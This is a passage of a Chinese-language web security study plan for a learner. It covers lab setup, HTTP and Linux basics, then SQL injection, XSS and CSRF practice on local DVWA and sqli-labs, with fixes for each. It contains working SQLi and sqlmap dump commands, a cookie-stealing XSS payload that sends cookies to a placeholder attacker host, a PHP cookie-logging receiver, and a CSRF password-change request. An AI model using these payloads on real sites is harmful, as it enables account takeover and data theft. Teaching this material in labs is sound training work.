# WEB 安全从零到实战 · 完整学习计划

> **基于手册**：[ReAbout/web-sec](https://github.com/ReAbout/web-sec) — WEB 安全手册（红队安全技能栈）
> **适用人群**：零基础小白 / 转行学习者 / 已具备一定基础的进阶者
> **学习环境**：Kali Linux + DVWA + sqli-labs（已有），本文档补充必要靶场、工具与练习平台
> **文档说明**：本文档所有命令均可直接复制执行，每条命令附带逐条讲解、常见问题排查与防护修复方案
> **进度说明**：本文档已根据你此前的学习记录（《网络安全自学完整计划》《第2-4周自学操作流程》《第二部分-Web安全核心操作流程》《第三部分-渗透测试实战操作流程》《第五周sql注入复盘笔记》）标注了各主题的掌握程度。标记含义：✅ 已掌握 · 🟡 部分掌握 / 练习中 · ⬜ 尚未学习。

---

## 📊 学习进度总览（根据你的学习记录标注）

> 你的已有基础（来自《网络安全自学完整计划》）：Linux 系统操作、计算机网络（OSI/TCP-IP/HTTP/DNS）、数据库 SQL、C 语言编程、Web 前端（HTML/CSS/表单）。下面按主题汇总当前进度。

| 主题 | 状态 | 掌握内容 | 仍需深入 |
|------|------|---------|---------|
| **基础地基** | ✅ 已掌握 | Linux 权限/SUID/iptables/日志分析、Python requests/re/目录扫描器、浏览器 DevTools/Cookie/同源策略/DOM 操作、HTTP 抓包 | 端口扫描器多线程优化、HTTPS/TLS 原理 |
| **SQL 注入** | ✅ 已掌握 | 联合查询、报错、布尔盲注、时间盲注四大流派 + sqlmap 自动化 + WAF 绕过 + 字符集冲突处理 | OOB 外带、Oracle/MSSQL 注入、二次注入、宽字节注入 |
| **XSS** | ✅ 已掌握 | 反射型/存储型/DOM 型 + Cookie 窃取 + 大小写/事件/伪协议绕过 | CSP 绕过进阶、XSS 框架（BeEF）、盲 XSS |
| **CSRF** | ✅ 已掌握 | 原理 + PoC 页面构造 + Token/SameSite 机制 | 跨站请求走私结合、Login CSRF |
| **文件上传** | 🟡 练习中 | 前端 JS/MIME/黑名单绕过 + .htaccess + 蚁剑连接 | 解析漏洞（Apache/Nginx/IIS）、内容校验绕过、图片马 |
| **文件包含** | 🟡 练习中 | LFI/RFI + php://filter 读源码 + 日志包含 getshell | data:// / php://input、session 包含 |
| **命令注入** | 🟡 练习中 | 拼接符（; && \| \|\|）+ sleep 盲注 + 空格/关键字绕过 | 反弹 shell 实战、无回显场景 DNS 外带 |
| **SSRF** | 🟡 练习中 | 原理 + 内网探测 + dict/gopher 协议概念 | gopher 打 Redis 实战、DNS rebinding、云 metadata |
| **XXE** | 🟡 练习中 | 外部实体读取文件 | 盲 XXE、SSRF 型 XXE、参数实体 |
| **SSTI 模板注入** | ⬜ 未学习 | — | Jinja2/Twig/Freemarker 全部 |
| **反序列化** | ⬜ 未学习 | — | PHP/Java/Python/.NET 各方向 |
| **越权（IDOR）** | ⬜ 未学习 | — | 水平/垂直越权、双账号对比法 |
| **JWT 攻击** | ⬜ 未学习 | — | alg=none、算法混淆、弱密钥 |
| **补充漏洞** | ⬜ 未学习 | — | NoSQL/请求走私/CRLF/HPP/缓存投毒/GraphQL |
| **代码审计** | ⬜ 未学习 | — | PHP/Java 审计思路 |
| **渗透全流程** | 🟡 部分掌握 | 信息收集（nmap/dirsearch/whatweb/wpscan）、反弹 shell、中间件/CMS 漏洞概念 | 提权、内网横向、隧道、后渗透、报告撰写 |

> **总结**：你已扎实完成「基础地基 + OWASP Top 10 核心漏洞（SQLi/XSS/CSRF 完全掌握，上传/包含/命令注入/SSRF/XXE 练习中）」阶段，正处于从「单点漏洞」向「渗透全流程 + 进阶漏洞」过渡的关键期。下一步优先补齐：**文件上传/包含/命令注入/SSRF/XXE 的收尾 → 越权/JWT/SSTI/反序列化 → 代码审计 → 渗透实战（提权/内网）**。

---

## 📑 目录

- [📊 学习进度总览](#-学习进度总览根据你的学习记录标注)
- [第 0 章 学习准备与环境搭建](#第-0-章-学习准备与环境搭建)
- [第 1 章 基础地基：网络 / Web / Linux 入门](#第-1-章-基础地基)
- [第 2 章 漏洞理解篇（原理先行）](#第-2-章-漏洞理解篇)
- [第 3 章 漏洞利用篇（逐个击破）](#第-3-章-漏洞利用篇)
  - [3.1 SQL 注入](#31-sql-注入)
  - [3.2 XSS 跨站脚本](#32-xss-跨站脚本)
  - [3.3 CSRF 跨站请求伪造](#33-csrf-跨站请求伪造)
  - [3.4 SSRF 服务端请求伪造](#34-ssrf-服务端请求伪造)
  - [3.5 文件上传漏洞](#35-文件上传漏洞)
  - [3.6 命令注入 & 代码执行](#36-命令注入--代码执行)
  - [3.7 XXE 外部实体注入](#37-xxe-外部实体注入)
  - [3.8 SSTI 模板注入](#38-ssti-模板注入)
  - [3.9 文件包含 / 任意文件读取](#39-文件包含--任意文件读取)
  - [3.10 反序列化漏洞](#310-反序列化漏洞)
  - [3.11 越权（IDOR / 访问控制缺失）](#311-越权idor--访问控制缺失)
  - [3.12 JWT 攻击](#312-jwt-攻击)
  - [3.13 其他补充漏洞（NoSQL / 请求走私 / CRLF / HPP / 缓存投毒 / GraphQL）](#313-其他补充漏洞)
- [第 4 章 代码审计篇](#第-4-章-代码审计篇)
- [第 5 章 渗透测试全流程篇](#第-5-章-渗透测试全流程篇)
- [第 6 章 靶场与练习平台清单](#第-6-章-靶场与练习平台清单)
- [第 7 章 工具清单](#第-7-章-工具清单)
- [第 8 章 学习路线总表 & 时间规划](#第-8-章-学习路线总表--时间规划)
- [第 9 章 常见问题 FAQ](#第-9-章-常见问题-faq)
- [第 10 章 合法合规与职业发展](#第-10-章-合法合规与职业发展)
- [附录：参考资料与手册文档索引](#附录参考资料与手册文档索引)
- [附录 B：权威标准与官方来源速查（可追溯）](#附录-b权威标准与官方来源速查可追溯)
  - [B.1 权威框架与标准总览（OWASP Top 10 / NIST CSF / CIS / CWE Top 25）](#b1-权威框架与标准总览)
  - [B.2 OWASP Cheat Sheet 权威防护速查（按漏洞分类）](#b2-owasp-cheat-sheet-权威防护速查按漏洞分类)
  - [B.3 主流工具官方命令速查（sqlmap / Nmap）](#b3-主流工具官方命令速查可执行)
  - [B.4 如何追踪与引用来源（学习方法论）](#b4-如何追踪与引用来源学习方法论)

---

## 第 0 章 学习准备与环境搭建

### 0.1 明确学习目标

在动手之前，先问自己三个问题：

1. **学这个干什么？** — 是打 CTF 竞赛、做渗透测试工程师、做安全开发，还是做甲方安全运营？
2. **每周能投入多少时间？** — 建议每天 1~2 小时，周末 3~4 小时。
3. **当前基础如何？** — 会不会 Linux 基础命令？会不会一点编程（PHP/Python/Java）？

> 方向不同，学习重点不同：
> - **CTF 竞赛** → 侧重漏洞利用（第 3 章）+ 快速解题能力
> - **渗透测试工程师** → 侧重全流程（第 5 章）+ 报告撰写
> - **安全开发 / SRC 漏洞挖掘** → 侧重代码审计（第 4 章）+ 业务逻辑漏洞
> - **甲方安全运营** → 侧重防御与修复（每个漏洞的"防护方案"部分）

### 0.2 环境准备（在已有基础上补充）

你已经有了 Kali Linux、DVWA、sqli-labs。下面是完整的环境清单：

| 组件 | 作用 | 优先级 | 说明 |
|------|------|--------|------|
| **Kali Linux** | 渗透主系统，内置大量工具 | ✅ 已有 | 建议用虚拟机（VMware/VirtualBox） |
| **DVWA** | Web 漏洞靶场（新手首选） | ✅ 已有 | 覆盖 SQLi/XSS/CSRF/上传/命令执行等 |
| **sqli-labs** | SQL 注入专项靶场 | ✅ 已有 | 从 Less-1 到 Less-65 循序渐进 |
| **Burp Suite** | Web 渗透必备神器 | ⭐ 补充 | 抓包、改包、重放、扫描 |
| **Docker** | 快速部署各种靶场 | ⭐ 补充 | 避免环境配置踩坑 |
| **Nmap** | 端口扫描 | ⭐ 补充 | Kali 已内置 |
| **sqlmap** | SQL 注入自动化工具 | ⭐ 补充 | Kali 已内置 |
| **OWASP ZAP** | 免费 Web 扫描器 | 可选 | Burp 的免费替代 |
| **Pikachu / upload-labs** | 更多专项靶场 | ⭐ 补充 | 见第 6 章 |

### 0.3 环境搭建命令（逐条讲解）

#### 0.3.1 验证 Kali 网络连通性

```bash
# 查看本机 IP 地址
ip a
# 讲解：ip a 是查看网络接口信息的命令，会列出所有网卡的 IP 地址。
# 效果：找到类似 "192.168.x.x" 或 "10.x.x.x" 的地址，这是你 Kali 的局域网 IP，靶场访问时会用到。

# 测试网络连通
ping -c 4 8.8.8.8
# 讲解：ping 用于测试到目标主机的网络连通性，-c 4 表示只发 4 个包就停止。
# 效果：如果能收到回复（显示 time=xx ms），说明能上网；若超时则检查网络设置。
```

**常见问题排查**：

| 问题 | 原因 | 解决办法 |
|------|------|---------|
| `ip a` 没有 IP | 网卡没启用 / 虚拟机网络没设置 | 虚拟机网络改为"桥接"或"NAT"；`dhclient eth0` 重新获取 |
| `ping` 超时 | DNS 或网关问题 | 先 `ping 8.8.8.8`（纯 IP），能通则只是 DNS 问题 |

#### 0.3.2 安装 Docker（用于快速起靶场）

```bash
# 更新软件源
sudo apt update
# 讲解：sudo 表示用管理员权限执行，apt update 刷新软件包列表，让后续安装能找到最新版本。

# 安装 Docker
sudo apt install -y docker.io
# 讲解：apt install 安装软件，-y 表示自动确认所有询问。docker.io 是 Docker 的社区版本包。

# 启动 Docker 服务
sudo systemctl start docker
# 讲解：systemctl 是系统服务管理命令，start docker 启动 Docker 守护进程。

# 设置开机自启
sudo systemctl enable docker
# 讲解：enable 让 Docker 每次开机自动启动，避免每次手动开启。

# 验证安装
docker --version
# 讲解：查看 Docker 版本号，若能正常显示则安装成功。
```

**常见问题排查**：

| 问题 | 解决办法 |
|------|---------|
| `docker: permission denied` | 需要加 `sudo`，或把自己加入 docker 组：`sudo usermod -aG docker $USER` 然后重新登录 |
| 提示 `Cannot connect to the Docker daemon` | 服务没启动，执行 `sudo systemctl start docker` |
| 国内拉镜像慢 | 配置镜像加速器（阿里云 / 腾讯云镜像仓库） |

### 0.4 学习记录规范

建议每学完一个漏洞，按下面模板记录笔记：

```markdown
## 漏洞名称：SQL 注入
- 原理一句话：
- 成立条件：
- 利用步骤（命令）：
- 我的靶场实操记录：
- 修复方案：
- 踩过的坑：
```

> 这份笔记最终可以整理成你自己的知识库，沉淀到 GitHub 或笔记软件（Notion / 语雀）。

---

## 第 1 章 基础地基：网络 / Web / Linux 入门

> **⚠️ 重要提醒**：不要跳过基础直接学漏洞利用！地基不牢，后面每个漏洞都学不透。
>
> **📌 你的进度**：本章内容你已在《第 2-4 周自学操作流程》中系统学完并完成验收，包括 Linux 文件权限/SUID/iptables/日志分析、Python requests/正则/目录扫描器、浏览器 DevTools/Cookie/同源策略/DOM 操作、XSS 基础弹窗。以下内容作为复习巩固，重点补充你尚未覆盖的 **HTTPS/TLS 原理** 和 **端口扫描器进阶**。

### 1.1 HTTP 协议基础（必学）

理解漏洞的第一步，是理解浏览器和服务器之间到底怎么通信。

**核心概念**：

| 概念 | 一句话解释 |
|------|-----------|
| **请求（Request）** | 浏览器发给服务器的"我要什么" |
| **响应（Response）** | 服务器回给浏览器的"给你什么" |
| **HTTP 方法** | GET（获取）/ POST（提交）/ PUT / DELETE 等 |
| **请求头（Header）** | 附加信息，如 Cookie、User-Agent、Referer |
| **Cookie** | 服务器存在浏览器里的小纸条，用于识别身份 |
| **状态码** | 200 成功 / 302 跳转 / 403 禁止 / 404 不存在 / 500 服务器错误 |

**动手实验**：

```bash
# 用 curl 直接发一个 HTTP 请求，查看原始交互
curl -v http://example.com
# 讲解：curl 是命令行 HTTP 客户端，-v（verbose）会显示完整的请求头和响应头。
# 效果：你能看到 "> GET / HTTP/1.1" 是请求，"> Host: example.com" 是请求头，
#       "< HTTP/1.1 200 OK" 是响应行，下面跟着一堆 "<" 开头的是响应头。

# 指定请求方法为 POST
curl -X POST http://example.com
# 讲解：-X 指定请求方法，这里改成 POST。GET 和 POST 是最常用的两种方法。

# 带上 Cookie 请求
curl -H "Cookie: session=abc123" http://example.com
# 讲解：-H 添加自定义请求头，这里模拟浏览器带上 Cookie 身份凭证。
# 效果：很多鉴权漏洞（如越权、CSRF）的核心，就是理解 Cookie 如何代表身份。
```

### 1.2 用 Burp Suite 看请求（必学）

Burp Suite 是 Web 渗透的"显微镜"，几乎所有漏洞都要靠它抓包分析。

**安装与启动**：

```bash
# Kali 已内置，直接启动
burpsuite
# 讲解：启动 Burp Suite。首次启动选择 "Temporary project"（临时项目）→ "Use Burp defaults" 即可。

# 如果没安装，用命令安装
sudo apt install -y burpsuite
```

**配置浏览器代理**（以 Firefox 为例）：
1. 打开 Firefox → 设置 → 网络设置 → 手动代理
2. HTTP 代理填 `127.0.0.1`，端口 `8080`
3. 勾选"为所有协议使用此代理"
4. 访问 `http://burp` 下载并安装 CA 证书（用于解密 HTTPS）

**抓包三步走**：
1. Burp → Proxy 标签 → Intercept（拦截）开关打开
2. 浏览器访问任意网站
3. Burp 会拦截请求，点击 Forward 放行，或 Drop 丢弃

### 1.3 Linux 常用命令速成（必学）

渗透测试大量在 Linux 下操作，以下命令必须熟练：

```bash
# 目录与文件操作
pwd                 # 讲解：显示当前所在目录（print working directory）
ls -la              # 讲解：列出当前目录所有文件（含隐藏文件），-l 详细信息 -a 显示隐藏
cd /tmp             # 讲解：切换目录到 /tmp（change directory）
cat /etc/passwd     # 讲解：查看文件内容（concatenate），/etc/passwd 是用户账号信息文件

# 文件查找与内容搜索
find / -name "flag*" 2>/dev/null
# 讲解：find 按名称查找文件，/ 表示从根目录找，-name 指定文件名，flag* 通配。
#       2>/dev/null 把错误信息（如无权限）丢弃，只显示成功结果。
# 效果：CTF 中常用它找 flag 文件。

grep -r "password" /var/www/html
# 讲解：grep 在文件中搜索关键字，-r 递归搜索子目录，"password" 是关键词。
# 效果：在网站目录里找包含 password 的代码，常能发现硬编码密码。

# 权限与执行
chmod +x script.sh  # 讲解：给脚本添加可执行权限（change mode）
./script.sh         # 讲解：执行当前目录下的脚本
```

### 1.4 编程基础（按需选择）

| 语言 | 用途 | 优先级 | 建议 |
|------|------|--------|------|
| **PHP** | 理解 PHP 类靶场（DVWA 就是 PHP） | ⭐⭐⭐ | 先学，能读懂即可 |
| **Python** | 写脚本、自动化、利用工具 | ⭐⭐⭐ | 必学，掌握基础语法 |
| **SQL** | 理解 SQL 注入的前提 | ⭐⭐⭐ | 必学，掌握 SELECT/UNION/WHERE |
| **JavaScript** | 理解 XSS、前端漏洞 | ⭐⭐ | 基础即可 |
| **Java** | 理解反序列化、SSRF 等企业级漏洞 | ⭐ | 进阶再学 |

**SQL 基础速成**：

```sql
-- 查询语句基础（这是理解 SQL 注入的核心）
SELECT * FROM users;                          -- 查询 users 表所有数据
SELECT username, password FROM users WHERE id = 1;  -- 按条件查询
SELECT * FROM users WHERE username = 'admin' AND password = '123456';  -- 多条件

-- UNION 联合查询（SQL 注入最常用的手法）
SELECT id, name FROM users UNION SELECT 1, 2;  -- 把两个查询结果合并
```

---

## 第 2 章 漏洞理解篇（原理先行）

> **手册原文思路**：先读 `vul/` 理解漏洞原理和成立条件，再读 `exp/` 学 payload。
> **本章目标**：建立"漏洞 = 输入可控 + 处理不当"的统一思维模型。
>
> **📌 你的进度**：你已通过《完整计划》第 1-4 周的"安全视角"切换训练掌握了漏洞思维模型，尤其是同源策略、Cookie 属性、认证机制等概念。本章可快速回顾，直接进入第 3 章实战。

### 2.1 漏洞的统一思维模型

几乎所有 Web 漏洞都可以抽象为同一个公式：

```
漏洞 = 用户的输入进入了不该进入的地方 + 程序没有做充分的过滤/校验
```

| 漏洞类型 | "用户的输入" | "不该进入的地方" |
|---------|-------------|----------------|
| SQL 注入 | 参数值 | 拼接进了 SQL 语句 |
| XSS | 参数值 | 被当成 HTML/JS 输出到页面 |
| 命令执行 | 参数值 | 拼接进了系统命令 |
| 文件上传 | 上传的文件 | 被服务器当成脚本执行 |
| SSRF | URL 参数 | 服务器拿它去访问内网 |
| 越权 | 用户 ID | 没校验是不是本人 |

> **记住这个模型，学任何漏洞都能快速抓住本质。**

### 2.2 手册中"漏洞理解篇"的知识点映射

| 手册主题 | 文档 | 一句话理解 |
|---------|------|-----------|
| 同源策略 & CSP & JSONP | `vul/VUL-CrossDomain.md` | 浏览器如何限制跨域访问，这是理解 XSS/CSRF 的前提 |
| 应用分层 & 漏洞分类 | `vul/VUL-Backend.md` | 前端/后端/数据库分层，漏洞出现在哪一层 |
| 认证机制 & 密码误用 | `vul/VUL-Auth-Session.md` | 登录怎么做的，密码存错会怎样 |
| Web 密码学误用 | `vul/VUL-Crypto.md` | 加密用错比不用更危险 |
| 业务逻辑漏洞原理 | `vul/VUL-Logic.md` | 不靠技术漏洞，靠逻辑漏洞（如改价格、改数量） |

### 2.3 同源策略（SOP）— 理解前端安全的地基

**核心概念**：

```
同源 = 协议 + 域名 + 端口 三者完全相同
```

| 对比 | 是否同源 | 原因 |
|------|---------|------|
| `http://a.com/x` vs `http://a.com/y` | ✅ 同源 | 协议域名端口相同 |
| `http://a.com` vs `https://a.com` | ❌ 不同源 | 协议不同 |
| `http://a.com` vs `http://b.com` | ❌ 不同源 | 域名不同 |
| `http://a.com:80` vs `http://a.com:8080` | ❌ 不同源 | 端口不同 |

**为什么重要**：浏览器默认禁止跨源读取数据，XSS 绕过 SOP、CSRF 利用浏览器"自动带 Cookie"的特性、CORS 是服务器主动放开跨源限制——这些都要先理解 SOP 才能理解。

---

## 第 3 章 漏洞利用篇（逐个击破）

> **本章是核心**。每个漏洞按统一模板讲解：
> 1. **原理**（一句话 + 通俗比喻）
> 2. **靶场定位**（在 DVWA / sqli-labs 哪个关卡练）
> 3. **完整命令**（逐条讲解）
> 4. **常见问题排查**
> 5. **防护与修复方案**

---

### 3.1 SQL 注入

> **手册文档**：`exp/EXP-SQLi-MySQL.md`、`exp/EXP-SQLi-Oracle.md`、`exp/EXP-DB-MSSQL.md`、`exp/EXP-SQLi-OOB.md`
>
> **📌 你的进度**：这是你掌握最扎实的漏洞。你已通过 sqli-labs 前 20 关 + DVWA 全难度 +《第五周 SQL 注入复盘笔记》掌握了**联合查询、报错注入（extractvalue）、布尔盲注、时间盲注**四大流派，并能熟练使用 sqlmap 自动化 + Burp 配合绕过 WAF。下方补充你的实战踩坑经验，并列出仍需深入的盲区。

#### 3.1.1 原理

**一句话**：用户输入被直接拼进 SQL 语句，导致攻击者可以篡改 SQL 逻辑。

**通俗比喻**：程序本来想问数据库"查一下用户名为 X 的密码"，但如果你输入的 X 是 `' or '1'='1`，拼出来的话就变成了"查一下用户名为空 或 1=1（恒真）的密码"，于是把所有用户密码都查出来了。

#### 3.1.2 靶场定位

- **sqli-labs Less-1**（最经典的入门关卡）
- **DVWA → SQL Injection（low 难度）**

#### 3.1.3 完整命令（sqli-labs Less-1 为例）

**第一步：确认存在注入点**

```bash
# 正常访问，查看页面
curl "http://localhost/sqli-labs/Less-1/?id=1"
# 讲解：正常传入 id=1，页面显示一个用户的信息，说明这个参数会查询数据库。

# 加一个单引号，制造语法错误
curl "http://localhost/sqli-labs/Less-1/?id=1'"
# 讲解：单引号 ' 在 SQL 里是字符串的结束符。程序把 id=1' 拼进语句后，
#       变成 WHERE id='1''，多了一个引号，SQL 语法报错。
# 效果：页面如果显示 SQL 报错信息（如 "You have an error in your SQL syntax"），
#       说明存在注入，且是"报错注入"。

# 用恒真条件绕过
curl "http://localhost/sqli-labs/Less-1/?id=1' or '1'='1"
# 讲解：拼进语句后变成 WHERE id='1' or '1'='1'，因为 1=1 恒真，
#       所以会查出所有记录。效果：页面会显示多个用户信息。
```

**第二步：判断字段数（用 ORDER BY）**

```bash
# 逐步增加数字，找到字段数量
curl "http://localhost/sqli-labs/Less-1/?id=1' order by 3--+"
# 讲解：order by N 表示按第 N 列排序。--+ 是注释，把后面的单引号注释掉，避免语法错误。
#       N 从小到大试，页面正常则说明字段数 >= N，报错则说明字段数 < N。
# 效果：Less-1 通常是 3 个字段，所以 order by 3 正常，order by 4 报错。
```

> **补充说明**：`--+` 是 URL 中注释符的一种写法（`--` 是 SQL 注释，`+` 在 URL 里代表空格）。不同数据库/场景注释符可能不同，常见的有 `--`、`#`、`--+`。

**第三步：用 UNION 联合查询找到回显位置**

```bash
# 让原查询为空，用 UNION 输出我们的数据
curl "http://localhost/sqli-labs/Less-1/?id=-1' union select 1,2,3--+"
# 讲解：id=-1 使原查询查不到数据（因为 id 通常从 1 开始），
#       这样 union select 1,2,3 的结果就会显示在页面上。
#       select 1,2,3 是占位，看哪个数字回显到页面，哪个位置就是"回显点"。
# 效果：页面显示 "Your Login name:2 Your Password:3"，说明第 2、3 列会回显。
```

**第四步：在回显点爆数据**

```bash
# 爆当前数据库名
curl "http://localhost/sqli-labs/Less-1/?id=-1' union select 1,database(),3--+"
# 讲解：database() 是 MySQL 函数，返回当前数据库名，把它放在回显点第 2 列。
# 效果：显示当前数据库名（Less-1 通常是 security）。

# 爆所有表名
curl "http://localhost/sqli-labs/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+"
# 讲解：information_schema.tables 是 MySQL 的元数据库，存着所有表的信息。
#       group_concat(table_name) 把多个表名拼成一个字符串。
#       where table_schema=database() 只查当前数据库的表。
# 效果：列出当前库所有表（如 users、emails 等）。
```

**第五步：用 sqlmap 自动化（学完手注后）**

```bash
# 自动检测并注入
sqlmap -u "http://localhost/sqli-labs/Less-1/?id=1" --batch
# 讲解：-u 指定目标 URL，--batch 全程自动确认不询问。
# 效果：sqlmap 自动判断注入类型，并尝试提取数据。

# 获取当前数据库
sqlmap -u "http://localhost/sqli-labs/Less-1/?id=1" --dbs
# 讲解：--dbs 枚举所有数据库名。

# 获取指定库的表
sqlmap -u "http://localhost/sqli-labs/Less-1/?id=1" -D security --tables
# 讲解：-D 指定数据库，--tables 列出该库所有表。

# 导出数据
sqlmap -u "http://localhost/sqli-labs/Less-1/?id=1" -D security -T users --dump
# 讲解：-T 指定表，--dump 导出表里所有数据。
```

#### 3.1.4 常见问题排查

| 问题 | 原因 | 解决办法 |
|------|------|---------|
| 加 `'` 不报错 | 可能不是字符型注入，或错误被屏蔽 | 尝试数字型（不加引号）`?id=1 and 1=1`；或换报错/盲注思路 |
| `union select` 没回显 | 字段数不对，或回显点被隐藏 | 先用 order by 确认字段数；用 select 1,2,3 定位回显点 |
| 中文乱码 | 编码问题 | URL 中特殊字符用 URL 编码（空格=%20，单引号=%27） |
| 页面 404 | 路径错误或服务没启动 | 确认 Apache/MySQL 已启动：`systemctl status apache2` |

#### 3.1.5 防护与修复方案

**开发侧修复（根本）**：

```php
// ❌ 错误写法：直接拼接（存在注入）
$query = "SELECT * FROM users WHERE id = '$id'";

// ✅ 正确写法 1：参数化查询（PDO 预处理语句）
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
// 讲解：预处理语句把 SQL 结构和数据分离，数据永远不会被当成 SQL 代码执行。

// ✅ 正确写法 2：使用框架的 ORM（如 Laravel Eloquent）
$user = User::where('id', $id)->first();
// 讲解：ORM 自动做了参数化处理。
```

**其他防护层**：
1. **最小权限**：数据库账号只给必要权限（如只读），不给 root。
2. **过滤输入**：对特殊字符（`'`、`"`、`--`、`#`）转义或过滤（但这是辅助，不是根本）。
3. **部署 WAF**：拦截常见的注入 payload（但可被绕过，不能依赖）。
4. **隐藏报错**：生产环境关闭详细错误信息，避免泄露库结构。

#### 3.1.6 你的实战踩坑经验（来自复盘笔记，务必记住）

这些是你实操时亲历并总结的坑，能省掉大量排错时间：

1. **`#` 注释失效**：浏览器地址栏直接输入 `#` 会被当成页面锚点，不会发给服务器！必须改用 `--+` 或 `%23`。
2. **PHP 8 报错中断页面**：新版 PHP 遇到 SQL 报错会直接抛出 Fatal Error 中断页面。报错注入前需改靶场源码：开启 `error_reporting(E_ALL)`，并在 `mysqli_query` 前加 `mysqli_report(MYSQLI_REPORT_OFF);`。
3. **新版 MariaDB 移除了 `updatexml`**：报错注入请认准 `extractvalue`。
4. **盲注脚本死循环**：写 Python 盲注脚本时务必加 `found = False` 标志位，猜解到空字符（超出长度）时自动 `break`，否则无限循环。
5. **字符集冲突（Collation）报错**：sqlmap 或手工 UNION 时报 `Illegal mix of collations`，是 CAST 出的 `utf8mb4` 与原表 `gbk` 不一致。解决：手工加 `COLLATE gbk_chinese_ci`，或 sqlmap 加 `--no-cast` / `--hex`。
6. **sqlmap 卡在枚举列名**：直接加 `-C "id,username,password"` 告诉它列名，或用 `--threads=10` 加速。
7. **跑 sqlmap 务必加 `--batch`**，否则自动化会中途停下等你确认。

#### 3.1.7 仍需深入的方向（进阶）

| 方向 | 说明 | 手册文档 |
|------|------|---------|
| **二次注入** | 数据入库时转义、取出时未转义导致的注入 | `EXP-SQLi-MySQL.md` |
| **宽字节注入** | GBK 编码下 `%df'` 吃掉反斜杠绕过转义 | 同上 |
| **OOB 外带** | 无回显时用 DNS/HTTP 把数据带出来 | `EXP-SQLi-OOB.md` |
| **堆叠注入** | 用 `;` 执行多条 SQL | 同上 |
| **Oracle / MSSQL 注入** | 不同数据库语法差异 | `EXP-SQLi-Oracle.md`、`EXP-DB-MSSQL.md` |

---

### 3.2 XSS 跨站脚本

> **手册文档**：`exp/EXP-XSS.md`
>
> **📌 你的进度**：你已在 DVWA 三个难度 + 第 19 天 DOM 操作练习中掌握反射型/存储型/DOM 型 XSS 的区别、Cookie 窃取，以及大小写/事件/伪协议等基础绕过。下方补充仍需深入的 CSP 绕过进阶。

#### 3.2.1 原理

**一句话**：攻击者注入恶意脚本，被其他用户浏览器执行。

**分类**：

| 类型 | 触发方式 | 危害 |
|------|---------|------|
| **反射型** | 诱导用户点链接触发 | 窃取 Cookie、钓鱼 |
| **存储型** | 脚本存进数据库，用户访问页面即触发 | 危害最大，可感染所有访问者 |
| **DOM 型** | 前端 JS 处理不当触发 | 前端逻辑漏洞 |

#### 3.2.2 靶场定位

- **DVWA → XSS (Reflected) / XSS (Stored) / XSS (DOM)**，从 low 到 high

#### 3.2.3 完整命令

```bash
# 反射型 XSS 基础测试（在 DVWA 输入框里输入）
<script>alert(1)</script>
# 讲解：这是一段 JS，alert(1) 会弹窗显示 1。
# 效果：如果提交后弹出窗口，说明存在反射型 XSS。

# 窃取 Cookie（进阶 payload）
<script>new Image().src='http://攻击者IP/cookie.php?c='+document.cookie</script>
# 讲解：document.cookie 获取当前页面 Cookie，通过 Image 标签发到攻击者服务器。
#       （攻击者需要自己搭一个接收脚本，见下方）

# 存储型 XSS：把上面的脚本提交到留言板等会保存的地方，
# 其他用户一打开这个页面就中招，不需要自己点恶意链接。
```

**攻击者接收 Cookie 的脚本（cookie.php）**：

```php
<?php
// 讲解：把收到的 Cookie 记录到文件里
$cookie = $_GET['c'];
file_put_contents('stolen.txt', $cookie . "\n", FILE_APPEND);
?>
```

#### 3.2.4 常见问题排查

| 问题 | 原因 | 解决办法 |
|------|------|---------|
| 弹窗没出来 | 被过滤 / 编码问题 | 尝试大小写绕过 `<ScRiPt>`，或用其他标签 `<img onerror=alert(1)>` |
| high 难度注入不进去 | 有较强过滤 | 学习 WAF 绕过技巧，或用事件型 payload |
| 拿不到 Cookie | Cookie 设了 HttpOnly | 说明该站点已做防护，换其他利用方式 |

#### 3.2.5 防护与修复方案

1. **输出编码**：输出到 HTML 时对 `<`、`>`、`"`、`'` 等做 HTML 实体编码。
2. **HttpOnly Cookie**：给关键 Cookie 加 `HttpOnly` 标记，JS 无法读取。

```php
// 设置 HttpOnly Cookie（PHP 示例）
setcookie("session", $value, 0, "/", "", false, true);
// 讲解：最后一个参数 true 表示 HttpOnly，JS 无法通过 document.cookie 读取。
```

3. **内容安全策略（CSP）**：通过响应头限制哪些脚本可执行。

```bash
# CSP 响应头示例
Content-Security-Policy: default-src 'self'; script-src 'self'
# 讲解：只允许加载同源的脚本，禁止内联脚本，能有效缓解 XSS。
```

4. **输入校验**：对用户输入做白名单校验（允许什么，而不是禁止什么）。

#### 3.2.6 仍需深入的方向（进阶）

| 方向 | 说明 |
|------|------|
| **CSP 绕过进阶** | 你已了解 CSP 概念（第 33-35 天），需深入学 `unsafe-inline`、`unsafe-eval`、JSONP 端点等绕过场景 |
| **XSS 框架（BeEF）** | 用浏览器利用框架实现更复杂的攻击（键盘记录、摄像头、内网探测） |
| **盲 XSS** | 打在管理员后台看不到的地方，等管理员触发 |
| **WAF 绕过** | 编码绕过（HTML 实体、URL 编码、Unicode）、标签混淆 |

---

### 3.3 CSRF 跨站请求伪造

> **手册文档**：`exp/EXP-CSRF.md`
>
> **📌 你的进度**：你已通过 DVWA CSRF 三个难度掌握 CSRF 原理、恶意链接/PoC 页面构造，以及 Token 验证绕过思路和 SameSite 防护机制（第 7 周）。下方补充进阶场景。

#### 3.3.1 原理

**一句话**：诱导已登录用户在不知情的情况下，向目标网站发起恶意请求。

**通俗比喻**：你已经登录了银行网站（浏览器里有 Cookie），这时你点开了攻击者发来的一个链接，这个链接里藏着一个"转账给攻击者"的请求。因为浏览器会自动带上你的 Cookie，银行以为是你本人操作，就把钱转走了。

**成立条件**（手册速查矩阵）：
- 仅凭 Cookie 鉴权（没有额外 token 校验）
- 存在状态变更的接口（如改密码、转账、发帖）
- 缺少额外校验（Token / SameSite / Origin 校验）

#### 3.3.2 靶场定位

- **DVWA → CSRF**

#### 3.3.3 完整命令

```bash
# 在 DVWA CSRF 关卡，观察"修改密码"的请求
# 正常修改密码的请求形如：
GET /dvwa/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change
# 讲解：注意这个请求靠 Cookie 识别身份，且没有 token 等额外校验。

# 攻击者构造的恶意页面（HTML 代码）：
```

```html
<!-- 攻击者放在自己网站上的恶意页面 -->
<html>
<body>
  <h1>恭喜你中奖了！</h1>
  <!-- 讲解：img 标签会自动发起 GET 请求，src 指向受害者的密码修改接口 -->
